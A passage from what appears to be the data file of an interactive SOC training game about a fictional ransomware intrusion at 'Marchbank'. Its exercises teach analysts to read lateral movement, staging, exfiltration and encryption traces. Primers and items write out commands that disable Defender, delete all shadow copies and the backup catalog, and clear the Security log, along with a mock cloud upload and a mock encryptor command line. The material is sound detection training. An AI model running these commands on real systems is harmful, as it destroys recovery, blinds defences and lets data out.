        title: "Three Tools, Three Traces",
        prompt: "Day -9. Stolen credentials are now moving through Marchbank, and the team doesn't know how. Elodie has a mixed pile of evidence from the target hosts. Sort each trace by the tool that leaves it.",
        buckets: [
          { id: "psexec", label: "PsExec" },
          { id: "wmi", label: "WMI" },
          { id: "rdp", label: "RDP" },
        ],
        items: [
          { id: "t1", text: "4624 logon type 3, then within seconds System event 7045 for a new service", bucket: "psexec", why: "A network logon, then a service created to run the command. T1021.002 over the ADMIN$ share." },
          { id: "t2", text: "A file copied into the ADMIN$ share just before a service starts", bucket: "psexec", why: "PsExec copies its service binary there. The service is often named PSEXESVC, unless someone renamed it." },
          { id: "t3", text: "WmiPrvSE.exe is the parent of cmd.exe on a print server", bucket: "wmi", why: "WMI (T1047) starts the process through Win32_Process Create, so WmiPrvSE.exe shows up as an unexpected parent." },
          { id: "t4", text: "A process appears remotely, with no new service and nothing written to ADMIN$", bucket: "wmi", why: "That quietness is what makes WMI attractive: there's no service to see in traditional logs." },
          { id: "t5", text: "4624 logon type 10, RemoteInteractive", bucket: "rdp", why: "A full graphical session, T1021.001, with a person driving it." },
          { id: "t6", text: "Events 4778 and 4779, session reconnected and disconnected", bucket: "rdp", why: "These record RDP sessions coming and going. The method is loud, and still easy to miss if nobody watches for odd sources." },
        ],
        primer: {
          title: "Three ways to move, none of them malicious",
          points: [
            "With a privileged account in hand, the crew needs to reach every host it means to encrypt. Stolen credentials do this over network logons, with no user involved.",
            "**PsExec** connects over SMB (Server Message Block), copies itself to ADMIN$ and creates a service. **WMI** (Windows Management Instrumentation) starts a process remotely. **RDP** opens a desktop.",
            "IT uses all three every day. Compare each case on **account, source, hour and number of hosts**.",
          ],
          example: {
            label: "Worked example: a fourth tool",
            lines: [
              "`wsmprovhost.exe` as the parent of a process points to WinRM, another remote management tool.",
              "You don't need to memorise every tool. Ask what it leaves on the target: a logon type, a new service, or an unusual parent.",
            ],
          },
          fold: true,
        },
      },
      {
        kind: "deduce",
        title: "Admin or Intruder?",
        prompt: "Saturday 31 October, the 30 minutes that matter. Six accounts moved between hosts that day. Five are doing their jobs. Strike them out as Elodie reads the clues, and name the one that isn't.",
        nameColumn: "Account",
        columns: ["Source host", "Hosts in 30 min", "Hour", "Trace on target", "Change ticket"],
        suspects: [
          { id: "ruiz", name: "adm-p.ruiz", cells: ["MB-IT-01", "1", "11:20", "4624 type 3, 7045 PSEXESVC", "CHG-2214"] },
          { id: "patch", name: "svc-patch", cells: ["MB-MGMT-01", "64", "22:00", "4624 type 3, 7045 update service", "CHG-2230"] },
          { id: "nkosi", name: "f.nkosi", cells: ["MB-MAINT-07", "11", "03:14", "4624 type 3, 7045 CHLRSVC", "None"] },
          { id: "adey", name: "r.adeyemi", cells: ["MB-MAINT-02", "1", "03:40", "4624 type 10", "None"] },
          { id: "wmi", name: "svc-inventory", cells: ["MB-MGMT-01", "3", "14:05", "WmiPrvSE.exe starts inventory.exe", "CHG-2219"] },
          { id: "varga", name: "adm-l.varga", cells: ["MB-IT-01", "9", "13:00", "4624 type 3, 7045 PSEXESVC", "CHG-2241"] },
        ],
        clues: [
          "One host isn't a spread. A person working on a single machine stays out of this hunt, whatever the hour.",
          "Tools running from the management server on their usual tickets are how patching and inventory look.",
          "The tool can be identical on both sides. What's left to compare is the hour and the paperwork.",
        ],
        culprit: "nkosi",
        why: "f.nkosi: eleven hosts in 30 minutes, at 03:14, from a maintenance workstation, with no ticket. adm-l.varga looks almost the same, nine hosts with PsExec, but at 13:00 from IT's own host on a ticket.",
      },
    ],
    // ── Reading 6: breaking recovery, tools and evidence ──
    "rw-r6": [
      {
        kind: "sequence",
        title: "Walk It Back From the Cleared Log",
        prompt: "MB-FS-01's Security log was wiped late on Sunday, but its other sources survived. Rebuild the server's last nine days, backwards. Start at the renamed files and work back to the moment the crew first arrived on this host.",
        howTo: [
          "Read all six first. None of them has a date.",
          "Tap the renamed files. Then tap what came just before, back to the crew's arrival.",
          "A wrong tap shakes. It means another event still sits between that one and the last one you placed.",
        ],
        items: [
          { id: "off", text: "Real-time protection off, and D:\\Stage added as an exclusion", note: "Day -5. Done first, so nothing would block the tools or the transfer that followed." },
          { id: "out", text: "34 archive volumes pushed to a cloud storage account", note: "Day -3. The longest job on this list, and the one that needs the quiet." },
          { id: "svc", text: "Service CHLRSVC installed after a type 3 logon from MB-MAINT-07", note: "Day -9. The stolen credential arrives on the server." },
          { id: "ren", text: "Files on MB-FS-01 renamed with a new extension", note: "Day 0, 05:20. The end of the line for this server." },
          { id: "vss", text: "Shadow copies deleted, then the Security log cleared with Event 1102 at 23:44", note: "Day -1, 23:41 and 23:44. Left to the last hours because both are loud." },
          { id: "stage", text: "34 .7z volumes appear in D:\\Stage, a folder that never held any", note: "Day -4. Packing up before the transfer." },
        ],
        order: ["ren", "vss", "out", "stage", "off", "svc"],
        miss: "Not yet. What came just before the last event you placed?",
        doneNote: "Read forward, that is the pattern: disable the tools ahead of the bulk transfer, and leave recovery and evidence to the last hours. So the tooling change on Day -5 was the last quiet warning before any data moved, and Sunday night was the last before any file was touched.",
        primer: {
          title: "Three things they break, and when",
          points: [
            "**Security tools, T1685 Disable or Modify Tools:** stop the agent, run `Set-MpPreference -DisableRealtimeMonitoring $true`, or add a path exclusion. This comes first, ahead of the bulk transfer.",
            "**Recovery, T1490 Inhibit System Recovery:** `vssadmin delete shadows /all /quiet` removes Windows' point-in-time snapshots, and `wbadmin` can delete the backup catalog. Left until just before impact.",
            "**Evidence, T1685.005 Clear Windows Event Logs:** `wevtutil cl Security`, also left until just before or at impact. The clearing itself writes **Event ID 1102**, with who did it and when.",
            "**Tamper protection** resists the first one, so a fleet ends up uneven: some hosts refuse the change, and hosts where it was misconfigured or missing accept it.",
          ],
          example: {
            label: "Worked example: a burglar's order of work",
            lines: [
              "The alarm is disabled first, because loading the van takes hours.",
              "The phone line is cut and the floor swept on the way out, because those are noticed at once.",
            ],
          },
          fold: true,
        },
      },
      {
        kind: "sort",
        title: "Retention Job or Last Warning?",
        prompt: "All of these commands have honest uses, and context decides. Elodie's retro-hunt found these on the Marchbank estate. Sort what's normal where it ran from what should have put someone on the phone.",
        buckets: [
          { id: "fine", label: "Normal in its context" },
          { id: "now", label: "Escalate now" },
        ],
        items: [
          { id: "a1", text: "vssadmin delete shadows /for=D: /oldest, started by the backup service on MB-BKP-01, Sunday 22:00, as the runbook says", bucket: "fine", why: "A documented backup server running its normal retention job, oldest copy only. This narrow context is the one honest case." },
          { id: "a2", text: "vssadmin delete shadows /all /quiet on MB-ACC-03, parent cmd.exe, under a service nobody recognises", bucket: "now", why: "All copies, quietly, from an unexpected parent, on a host that isn't a backup server. Among the strongest precursors there is." },
          { id: "a3", text: "wbadmin delete catalog -quiet on a file server with no backup role", bucket: "now", why: "Removing the catalog removes the way back. Nothing routine does this on this host." },
          { id: "a4", text: "Add-MpPreference -ExclusionPath for a slow label-design app, pushed from the management server with a ticket", bucket: "fine", why: "A scoped exclusion, from the normal management path, with an owner." },
          { id: "a5", text: "Set-MpPreference -DisableRealtimeMonitoring $true typed in a session opened from MB-MAINT-07 at 22:10", bucket: "now", why: "Turning off real-time protection from a maintenance workstation has no innocent reading. This stage is one of the last quiet windows before impact." },
          { id: "a6", text: "Event 1102 on MB-HR-02, SubjectUserName svc-print, 02:06", bucket: "now", why: "A print account clearing a log. The erasure gives you an exact account and time, so search every other log source around 02:06." },
          { id: "a7", text: "Event 1102 on a lab VM being rebuilt, on a ticket, by the engineer named on it", bucket: "fine", why: "The event is real and explained: same event, different context." },
          { id: "a8", text: "Add-MpPreference -ExclusionPath D:\\Stage, then a new folder of that name a day later", bucket: "now", why: "Excluding a folder that doesn't exist yet means someone is planning to use it." },
        ],
      },
    ],
    // ── Reading 7: exfiltration first ──
    "rw-r7": [
      {
        kind: "deduce",
        title: "Which Server Is Packing to Leave?",
        prompt: "MB-FS-01's staging is known. The question is what else was packed that week. Elodie's retro-hunt flagged six servers for new archive files on Day -4, and five are routine. Strike them out as the clues arrive, and name the second staging point.",
        nameColumn: "Server",
        columns: ["Archives on Day -4", "Held archives before?", "Tool and path", "Account", "Ticket"],
        suspects: [
          { id: "bkp", name: "MB-BKP-01", cells: ["410 backup files, 2 GB each", "Every night", "Backup agent, Program Files", "svc-bkpagent", "Standing job"] },
          { id: "erp", name: "MB-ERP-02", cells: ["6 .zip, 30 MB in all", "Every month-end", "Export job, Program Files", "svc-erp", "Standing job"] },
          { id: "hr", name: "MB-HR-02", cells: ["1 .7z, 40 MB", "Never", "7-Zip, Program Files", "a.lindqvist", "None"] },
          { id: "acc", name: "MB-ACC-03", cells: ["19 .rar, 2 GB each", "Never", "rar.exe, C:\\Users\\Public", "svc-print", "None"] },
          { id: "nas", name: "MB-NAS-02", cells: ["28 .zip, 2 GB each", "Never", "7-Zip, Program Files", "adm-p.ruiz", "CHG-3051, NAS move"] },
          { id: "lab", name: "MB-LAB-01", cells: ["22 .7z, 1 GB each", "Every quarter", "7-Zip, Program Files", "svc-lims", "Standing job"] },
        ],
        clues: [
          "Staging is a burst of large files. A few small ones aren't.",
          "Archives appearing where archives always appear are routine, however big they are.",
          "A burst with a change ticket has an owner you can ring.",
        ],
        culprit: "acc",
        why: "MB-ACC-03: 19 .rar volumes of 2 GB in a folder that never held any, from rar.exe in a public folder, under a print service account, with no ticket. Those volumes were still on disk when the note landed, so that data never left. Compare MB-FS-01, which showed the same signal one day before 140 GB went.",
        primer: {
          title: "Why the data leaves first",
          points: [
            "**Older model, about 2019 to 2021:** take a small sample, encrypt everything, mention the leak afterwards.",
            "**Current model:** staging and exfiltration run days before encryption, so the leverage is banked before the loudest stage of all.",
            "**Staging:** high-value shares go into a few large files with 7-Zip or WinRAR. A burst of .7z or .rar in a folder that never held any is unusual on its own.",
            "**Transfer:** rclone and MEGAcmd are seen most, and WinSCP, rsync and abused sync clients also appear.",
            "**Encryption-optional:** some campaigns never encrypt at all, so 'no files encrypted' doesn't mean you're safe.",
          ],
          example: {
            label: "Worked example: a month-end export",
            lines: [
              "A finance job zips six reports into a folder that has held zips every month for years.",
              "Same tool family, same file type, and no burst: it's a known job in a known place.",
            ],
          },
          fold: true,
        },
      },
    ],
    // ── Log analysis 2: warm-up on a live transfer ──
    "rw-la2": [
      {
        kind: "anatomy",
        title: "Anatomy of an Upload",
        prompt: "Before the graded detection: the record of Marchbank's transfer on Day -3, the one nobody read in time. Different tool and different server from what comes next, but the same field-by-field reading. Go through it the way Elodie wishes someone had.",
        source: "EDR process record · MB-FS-01 · Friday 6 November",
        fields: [
          { key: "Timestamp", value: "2026-11-06T02:05:31Z", label: "When" },
          { key: "FileName", value: "MEGAclient.exe", label: "What ran", note: "MEGAcmd's command-line client." },
          { key: "FilePath", value: "C:\\Users\\Public\\mc\\MEGAclient.exe", label: "From where", note: "The full path of the binary. MEGAcmd's installer uses the user's AppData\\Local\\MEGAcmd." },
          { key: "ParentBaseFileName", value: "cmd.exe", label: "Started by", note: "The process that started it. A scheduled job shows its scheduler or service here." },
          { key: "CommandLine", value: "MEGAclient.exe put -c D:\\Stage /arc-0611/", label: "What it was told", note: "put uploads, -c creates the remote folder, then the local source and the remote destination." },
          { key: "SHA256HashData", value: "5be1d2c47f0a93e6b8c1f2d7a4406e39c1d8ae7f22b06a5cd9013e47b6fa8e11", label: "Hash", note: "Matches the vendor's published release." },
          { key: "UserName", value: "MARCHBANK\\svc-print", label: "Whose account", note: "The account the process ran under." },
          { key: "BytesSent", value: "150323855360", label: "How much", note: "140 GB, at the end of the job." },
          { key: "PatternDispositionDescription", value: "Detected, no action taken", label: "What the sensor did", note: "What the sensor did about this detection." },
        ],
        summary: "Work through it in that order: where it ran from, who started it, what it was told to do, whose account it used, how much went. Then set each answer against the rest of the case.",
        primer: {
          title: "How to read a transfer command",
          points: [
            "A transfer tool's command line names a **source** and a **destination**.",
            "rclone reads `rclone copy <source> <remote>:<folder>`. `--config` names the file that defines each remote.",
            "`-q` hides progress output. `--transfers N` sets how many files move in parallel.",
            "`copy` reads the source and writes to the destination. `move` also deletes the source.",
          ],
          example: {
            label: "Worked example: an azcopy job",
            lines: [
              "`azcopy copy \"D:\\Reports\" \"https://marchbankstore.blob.core.example/reports\" --recursive --cap-mbps 200`",
              "Source: `D:\\Reports`. Destination: a storage container URL. `--recursive`: include subfolders. `--cap-mbps 200`: limit the rate.",
            ],
          },
          fold: true,
        },
      },
      {
        kind: "defuse",
        title: "Inside a Live Transfer",
        prompt: "Replay Friday 02:05, with you on shift this time. An upload is running from MB-FS-01, and four questions come up during the night. For each one, cut the answer that fits how a transfer actually works.",
        device: "The loading dock",
        seconds: 85,
        rounds: [
          {
            id: "account",
            state: "02:20: svc-print is disabled and its password reset. 02:40: the firewall still shows the upload running. Why?",
            wires: [
              { id: "a", label: "The disable hasn't reached every domain controller yet" },
              { id: "b", label: "The client's cloud session doesn't use that account" },
              { id: "c", label: "A second, hidden account has taken over the upload" },
            ],
            cut: "b",
            hint: "What does disabling an account act on?",
            why: "Disabling an account blocks the next sign-in. The process was already running on a token it got earlier, and its cloud session was never a Marchbank login.",
          },
          {
            id: "control",
            state: "The upload leaves through the site firewall, and this server doesn't use the web proxy. Where does a block actually reach it?",
            wires: [
              { id: "a", label: "Tighten the permissions on the Contracts share" },
              { id: "b", label: "A block rule on the web proxy" },
              { id: "c", label: "Contain the host, or block it at the firewall" },
            ],
            cut: "c",
            hint: "Which of these does the traffic actually pass through?",
            why: "A control only acts on what passes through it. The proxy never sees this traffic, and the volumes are local files in D:\\Stage, so the share's permissions don't apply.",
          },
          {
            id: "report",
            state: "The upload ends with 9 of 34 volumes gone. The director asks what was lost. What goes in the report?",
            wires: [
              { id: "a", label: "Report nothing lost: a split archive needs every volume" },
              { id: "b", label: "Report 26 percent of the data as lost" },
              { id: "c", label: "List what those nine held and report it exposed" },
            ],
            cut: "c",
            hint: "A volume is a slice of an archive. What's inside a slice?",
            why: "Files can often be recovered from part of a split archive, so nothing isn't a safe number. A percentage of volumes says nothing about which customers are affected. The archive's listing tells you what each volume held.",
          },
          {
            id: "optional",
            state: "Another company's case: 60 GB gone, nothing encrypted, no note after five days. The ticket is about to be downgraded.",
            wires: [
              { id: "a", label: "Downgrade it: no file has been touched, so no impact" },
              { id: "b", label: "Keep it a ransomware case: the data is the leverage" },
              { id: "c", label: "Close it after a restore test" },
            ],
            cut: "b",
            hint: "What did double extortion make encryption?",
            why: "Encryption-optional campaigns steal, threaten and never touch a file. 'No files encrypted' describes a stage, not a result.",
          },
        ],
        lesson: "A block works only where the traffic passes, and an account change only affects the next sign-in. Afterwards, what left is counted by what it held, not by how much of it there was.",
      },
    ],
    // ── Analyst choice: warm-up on one tool, two stories ──
    "rw-ac1": [
      {
        kind: "sort",
        title: "Same Alert, Different Night",
        prompt: "After the note, Marchbank's team goes back through a year of Exfiltration to Cloud Storage detections. Before anyone panics, Elodie wants each one read properly. Reveal what the config or job file really says, then sort each detection by verdict.",
        buckets: [
          { id: "tp", label: "True positive" },
          { id: "btp", label: "Benign true positive" },
          { id: "fp", label: "False positive" },
        ],
        items: [
          { id: "s1", text: "MEGAclient.exe from C:\\Users\\Public\\mc, parent cmd.exe, svc-print, no ticket", hidden: "Session file: a personal cloud account nobody at Marchbank owns", bucket: "tp", why: "Dropped tool, launched by hand, an account with no business there, and a destination that isn't Marchbank's." },
          { id: "s2", text: "azcopy.exe from C:\\Program Files\\AzCopy, parent ArchiveJob.exe, svc-archive, CHG-3107", hidden: "Job file: a storage account in Marchbank's own subscription, named in the ticket", bucket: "btp", why: "The detection was right: bulk data did go to cloud storage. It's also authorised, on every field, including the destination you opened." },
          { id: "s3", text: "WinSCP.com from C:\\Program Files\\WinSCP, parent SchedulerSvc.exe, svc-edi, CHG-2890", hidden: "Site config: the customer's data-exchange host, as written in the ticket", bucket: "btp", why: "A real transfer, the same one each night, to the partner the ticket names. Detected correctly, and fine." },
          { id: "s4", text: "Rule 'mega-put' fired on notepad.exe opening C:\\WMS\\logs\\omega-putaway.log", hidden: "No network connection. The string only matched a file name.", bucket: "fp", why: "The name omega-putaway happens to contain 'mega-put'. No transfer happened, so the detection itself was wrong, and the fix is tuning the rule." },
          { id: "s5", text: "WinSCP.com from C:\\Program Files\\WinSCP, parent SchedulerSvc.exe, svc-edi, CHG-2890", hidden: "Site config, changed last Friday: 203.0.113.140, which isn't the host in the ticket", bucket: "tp", why: "Every field looks like the good job above, except the one you had to open. This is why the destination gets checked and not assumed." },
          { id: "s6", text: "A tool called backup-sync.exe in C:\\ProgramData, run by a person's admin account at 02:00, no ticket", hidden: "Config: remote 'office-archive' points at 198.51.100.66", bucket: "tp", why: "A friendly name on the tool and a friendly name on the remote, and neither proves anything. The destination is unknown and nobody owns the job." },
        ],
        primer: {
          title: "Three verdicts for one alert",
          points: [
            "**True positive:** the activity happened and it isn't allowed.",
            "**Benign true positive:** the detection is right, the activity really happened, and it's authorised. The rule did its job.",
            "**False positive:** the detection itself was wrong. What it claims never happened.",
            "Compare five things: **install path, parent, destination, account, change ticket.** Open the config for the destination, because a name is only a label.",
          ],
          example: {
            label: "Worked example: a port scan at night",
            lines: [
              "A detection fires on a scan from the security team's own scanner, on a ticket, inside its usual window.",
              "The scan really happened and it's authorised: benign true positive. Closing it as a false positive would blame a rule that worked.",
            ],
          },
          fold: true,
        },
      },
    ],
    // ── Matching: warm-up, the case file with its tags ──
    "rw-m1": [
      {
        kind: "worksheet",
        title: "The Case File, Line by Line",
        prompt: "Elodie's case file, with the ATT&CK tags the team added as they went. Read down the file, then answer from it: the point is what the tags let you see across the whole 28 days.",
        caption: "Marchbank incident · case file · Day 0 is the note",
        columns: ["Day", "Where", "What the team found", "ATT&CK tag"],
        rows: [
          ["-28", "d.moyo's inbox", "A lure mail delivered, never opened", "T1566"],
          ["-27", "MB-MFT-01", "Exploit probes against the file gateway, all refused", "T1190"],
          ["-26", "MB-RDP-02", "1,912 failed logons, then ext-polarline signs in", "T1110, T1021.001"],
          ["-19", "MB-RDP-02", "\\Marchbank\\ChillerTelemetry created", "T1053.005"],
          ["-17", "MB-DC-01", "Burst of LDAP queries from MB-RDP-02", "Discovery"],
          ["-14", "MB-MAINT-07", "rtkhelper.exe reads lsass.exe memory", "T1003.001"],
          ["-12", "MB-DC-01", "Replication request from a workstation", "T1003.006"],
          ["-9", "11 servers", "CHLRSVC service pushed through ADMIN$", "T1021.002"],
          ["-5", "MB-FS-01", "Real-time protection off, exclusion added", "T1685"],
          ["-4", "MB-FS-01", "34 .7z volumes in D:\\Stage", "Collection"],
          ["-3", "MB-FS-01", "140 GB uploaded with MEGAcmd", "T1567.002"],
          ["-1", "MB-FS-01", "vssadmin removes all snapshots", "T1490"],
          ["-1", "MB-FS-01", "wevtutil wipes Security, Event 1102 at 23:44", "T1685.005"],
          ["0", "212 hosts", "Encryptor run, HOARFROST-README.txt dropped", "T1486"],
        ],
        questions: [
          { id: "days", q: "How many days passed between the sign-in that worked and the note?", hint: "Use the day the guessing succeeded, not the first attempt.", answer: ["26"], why: "Twenty-six days. Two earlier doors were tried and held, which is why the first failures aren't the start of the intrusion." },
          { id: "inside", q: "What is the last day in this file with no data outside Marchbank?", hint: "Find the first row where bytes leave, then go one row up.", answer: ["-4", "Day -4", "4"], why: "Day -4. After that the leak can't be undone, whatever else you stop." },
          { id: "before", q: "The first draft of the report says 'a ransomware attack on Monday'. How many rows of this file happened before Monday?", hint: "Count every row with a negative day.", answer: ["13"], why: "Thirteen of fourteen. Each one was a detection point that existed and was missed, which is the case for watching every stage and not only the last." },
        ],
        primer: {
          title: "Reading an ATT&CK tag",
          points: [
            "**T1059** is a technique: a way of reaching a goal. **T1059.001** is a sub-technique, one specific form of it.",
            "ATT&CK is MITRE's public catalogue of attacker behaviour. A tag says what happened in a shared language, so that the report means the same to everyone.",
            "Version 19 renumbered some of these. Log clearing and tool tampering now sit under Defense Impairment, with their new IDs.",
          ],
          example: {
            label: "Worked example: tagging a line",
            lines: [
              "`powershell.exe -enc ...` on a laptop: T1059.001, Command and Scripting Interpreter: PowerShell.",
              "The tag describes the behaviour. It doesn't tell you who did it or whether it was allowed.",
            ],
          },
          fold: true,
        },
      },
    ],
    // ── Reading 8: impact ──
    "rw-r8": [
      {
        kind: "match",
        title: "Why Nobody Can Just Get the Key",
        prompt: "Monday, 06:20. A director asks why IT can't simply pull the key out of a machine. Elodie wants an answer in plain words. Match each part of the encryption to what it does.",
        pairs: [
          { id: "sym", left: "AES or ChaCha20, inside the encryptor", right: "Encrypts each file's contents, fast, at scale", why: "A symmetric cipher is quick enough to get through a whole host in minutes." },
          { id: "pub", left: "RSA or ECC public key, built into the binary", right: "Wraps the file keys, so they can't be used without its partner", why: "This is why recovering a file key from memory rarely helps at any real scale: the keys are wrapped as fast as they're made." },
          { id: "priv", left: "The matching private key", right: "Never enters the victim's network at all", why: "It exists only on the attacker's infrastructure, so there's nothing on any Marchbank host to find." },
          { id: "dec", left: "A free public decryptor", right: "Exists only after a flaw in one build, or seized keys", why: "The cryptography isn't broken. Decryptors came from researchers finding implementation mistakes, or from law enforcement obtaining keys, as with Hive and LockBit." },
        ],
        primer: {
          title: "Two keys, two jobs",
          points: [
            "**Symmetric** encryption uses one key for both directions and is very fast.",
            "**Asymmetric** encryption uses a key pair: what the public key locks, only the private key opens.",
            "Ransomware uses both: a fast key for the data, and the public key to lock that fast key away.",
          ],
          example: {
            label: "Worked example: a post box",
            lines: [
              "Anyone can drop a letter through the slot. That's the public key.",
              "Only the holder of the key can open the box, and that key was never in the street.",
            ],
          },
          fold: true,
        },
      },
      {
        kind: "anatomy",
        title: "Anatomy of an Encryptor",
        prompt: "One record from the moment of impact, on a Marchbank file server. Read it field by field. Everything you need for a fast, accurate call on a host is here, and none of it depends on the binary's hash.",
        source: "EDR process record · MB-FS-02 · Monday 9 November",
        fields: [
          { key: "Timestamp", value: "2026-11-09T05:21:09Z", label: "When" },
          { key: "FileName", value: "spoolsrv.exe", label: "What ran", note: "The real print spooler is spoolsv.exe." },
          { key: "FilePath", value: "C:\\ProgramData\\Hf\\spoolsrv.exe", label: "From where", note: "spoolsv.exe runs from C:\\Windows\\System32." },
          { key: "ParentBaseFileName", value: "svchost.exe", label: "Started by", note: "Scheduled tasks start under the Task Scheduler service, which runs in svchost.exe." },
          { key: "UserName", value: "NT AUTHORITY\\SYSTEM", label: "Running as" },
          { key: "CommandLine", value: "spoolsrv.exe -dir C:\\;D:\\ -x .hfr9c04 -readme HOARFROST-README.txt -exclude C:\\Windows;C:\\Boot -t 16", label: "What it was told", note: "Target, extension, note name, excluded paths, threads." },
          { key: "FileRename", value: "D:\\Shares\\Ops\\pallet_plan.xlsx > pallet_plan.xlsx.hfr9c04", label: "What it does to a file", note: "The extension is added after the whole old name, so the original extension stays inside the new one." },
          { key: "Behavior", value: "18,400 files renamed in 60 seconds, one process", label: "Why it fired", note: "A behaviour count across all files, whatever the binary is called." },
          { key: "PatternDispositionDescription", value: "Detected, no action taken", label: "What the sensor did", note: "What the sensor did about this detection. Another value is Detected, kill process." },
        ],
        summary: "On one host, in a mass event, read four things: the name and folder, what the command line told it to do, the rename count, and what the sensor did.",
        primer: {
          title: "What the moment of impact looks like",
          points: [
            "**T1486, Data Encrypted for Impact:** one process modifies and renames huge numbers of files in a short window.",
            "A new, never-seen extension is appended to every file it touches.",
            "A note file lands in common, visible places.",
            "**Masquerading:** a binary named or placed to pass as a system file. And the business model matters: ransomware needs a victim who can read the note, and a wiper doesn't.",
          ],
          example: {
            label: "Worked example: a harmless bulk rename",
            lines: [
              "A photo tool renames 4,000 files in a minute inside one user's folder.",
              "The rate is high, but there's no new unknown extension, no note, and it stops at one folder.",
            ],
          },
          fold: true,
        },
      },
      {
        kind: "outbreak",
        title: "The Encryption Run",
        prompt: "Replay Monday 05:20. This board is one network segment with one host alight, and from it the encryptor copies itself on with the stolen account. You get the tool Marchbank had left that morning: isolate one host a turn. Keep it off the dispatch server, and see what a defender can still buy at this stage.",
        hostPrefix: "MB-WS",
        cols: 6,
        rows: 5,
        crown: "DISPATCH",
        via: "admin shares with the stolen f.nkosi credential",
        lesson: "However that went, look at what you were saving: hosts. The hashes left on Day -12 and the 140 GB on Day -3, long before you started. Every host here cost you a turn, and one set of resets on Day -14 would have cost an afternoon. A real team would isolate in bulk from the console and disable the account, and that still only limits the damage. Encryption is the last few minutes of a 26-day story, and it's the stage where a defender has least left to protect.",
        primer: {
          title: "What's left once it's running",
          points: [
            "There's no later link left to cut. You're choosing which hosts survive.",
            "**Isolation** cuts a host off the network and leaves it running, so its memory and processes stay there to examine.",
            "Cut **ahead** of the spread, where the network narrows. Isolating a host that has already fallen buys nothing here.",
            "This drill gives you one host a turn so you feel the pace. A real console isolates many at once.",
          ],
          example: {
            label: "Worked example: fire doors",
            lines: [
              "Fire is in bay 3 and heading for bay 4. Shutting bay 3's own door saves nothing.",
              "Shutting the corridor door ahead of it saves bays 4 to 9 with one move.",
            ],
          },
          fold: true,
        },
      },
      {
        kind: "defuse",
        title: "What Each Earlier Cut Would Have Saved",
        prompt: "The whole story, backwards, one last time. Elodie takes you from Sunday night back to the first sign-in. At each moment, cut the action that still breaks the chain there, and notice how much more each earlier cut saves.",
        device: "The chain",
        seconds: 110,
        rounds: [
          {
            id: "sun",
            state: "Sunday 23:55. One task on 48 hosts in three minutes, set for 05:20. The data is already out.",
            wires: [
              { id: "a", label: "Log it for the morning shift" },
              { id: "b", label: "Pull the task from every host before it fires" },
              { id: "c", label: "Block the cloud account and call the leak stopped" },
            ],
            cut: "b",
            hint: "What can still be saved at this hour?",
            why: "Five hours' warning. This saves availability, and it can't save the data, which left on Day -3. Saved here: 212 hosts.",
          },
          {
            id: "stage",
            state: "Day -4, 01:30. 34 fresh .7z volumes on a file server. Nothing has left.",
            wires: [
              { id: "a", label: "Cut that server's way out and bring in IR" },
              { id: "b", label: "Note it: no bytes out means there's no case yet" },
              { id: "c", label: "Delete the volumes and say nothing" },
            ],
            cut: "a",
            hint: "This is the last day the contracts are inside.",
            why: "The crew loses its second lever. It can still encrypt, but backups answer that. Saved here: the contracts, and any reason to pay.",
          },
          {
            id: "lateral",
            state: "Day -9, 03:14. One account, one workstation, a new service on 11 servers in 30 minutes, no ticket.",
            wires: [
              { id: "a", label: "Remove the service from the 11 servers and reboot them" },
              { id: "b", label: "Ask IT about it in the morning" },
              { id: "c", label: "Isolate the source and scope the account's reach" },
            ],
            cut: "c",
            hint: "Cleaning up where it landed, or stopping where it comes from?",
            why: "The source host and the credential are the spread. Saved here: everything still ahead, nine days of it.",
          },
          {
            id: "lsass",
            state: "Day -14, 03:10. A process reads lsass.exe on a maintenance workstation.",
            wires: [
              { id: "a", label: "Rotate what was cached, then scope f.nkosi's reach" },
              { id: "b", label: "Re-image the workstation and return it to the engineer" },
              { id: "c", label: "Wait to see if another alert fires" },
            ],
            cut: "a",
            hint: "What is the crew about to do with what it read?",
            why: "f.nkosi's reach is domain-wide, so the rotation and the scoping go that wide, before Day -12. The domain's hashes never leave. Saved here: a full domain reset, and the path to everything after it.",
          },
          {
            id: "first",
            state: "Day -26, 02:40. 1,912 failed sign-ins on an internet-facing RDP host, then one success.",
            wires: [
              { id: "a", label: "Ignore it: one success after failures is a typo" },
              { id: "b", label: "End the session, pull RDP offline, require MFA" },
              { id: "c", label: "Blocklist that one address and keep watching the host" },
            ],
            cut: "b",
            hint: "What would the buyer need in a week's time?",
            why: "The broker has nothing left to sell. Saved here: all of it, 26 days early, for an afternoon's work.",
          },
        ],
        lesson: "Each cut was smaller than the one after it, and saved more. The note wasn't the incident: it was the receipt. Every stage from the first sign-in onward had a detection point and an action that belonged to an analyst, which is why a SOC watches the whole chain and not only the last five minutes.",
      },
    ],
    // ── Log analysis 3: warm-up, the boss signal ──
    "rw-la3": [
      {
        kind: "deduce",
        title: "Which Host Gets the Technician?",
        prompt: "Monday 06:00. One technician is on site and can reach one machine first. Six hosts are on Elodie's list, and the console can act on most of them from a desk. Strike them out as the clues arrive, and name the one that needs a person at the switch.",
        nameColumn: "Host",
        columns: ["Sensor", "Tamper state", "Encryptor process", "Renamed files", "Disposition", "Last check-in"],
        suspects: [
          { id: "w118", name: "MB-WS-118", cells: ["Current", "On", "Killed 05:21", "40", "Detected, kill process", "1 min ago"] },
          { id: "w074", name: "MB-WS-074", cells: ["Current", "On", "Killed 05:21", "0", "Detected, kill process", "2 min ago"] },
          { id: "w203", name: "MB-WS-203", cells: ["Current", "On", "None", "None", "None", "Sunday 18:02, powered off"] },
          { id: "w096", name: "MB-WS-096", cells: ["14 months old", "Off", "Started 05:20", "Unknown", "None", "05:21, then nothing"] },
          { id: "w151", name: "MB-WS-151", cells: ["Current", "On", "None", "None", "None", "1 min ago"] },
          { id: "w040", name: "MB-WS-040", cells: ["Current", "On, detect-only policy", "Running", "6,200 so far", "Detected, no action taken", "1 min ago"] },
        ],
        clues: [
          "A technician adds nothing where the sensor has already ended the process.",
          "A host with no encryptor process and no renamed files gives them nothing to do yet.",
          "The console can isolate any host that's still checking in.",
        ],
        culprit: "w096",
        why: "MB-WS-096: an old sensor, tamper protection off, an encryptor started at 05:20, and silence since 05:21. The console can't isolate a host that has stopped reporting, so it takes a person at the switch. Now look back across the six rows at what the same encryptor did on each.",
        primer: {
          title: "What a disposition says",
          points: [
            "A **disposition** reports what the sensor did on one host, for one detection.",
            "Sensor age, policy and tamper state differ between hosts.",
            "**Hit** means it ran there. **Targeted** means it was sent there.",
          ],
          example: {
            label: "Worked example: a patch report",
            lines: [
              "Three of five servers report 'Succeeded', and two have no line at all.",
              "The agent column shows those two last checked in on Friday.",
            ],
          },
          fold: true,
        },
      },
    ],
    // ── Question 3: warm-up on who owns what ──
    "rw-q3": [
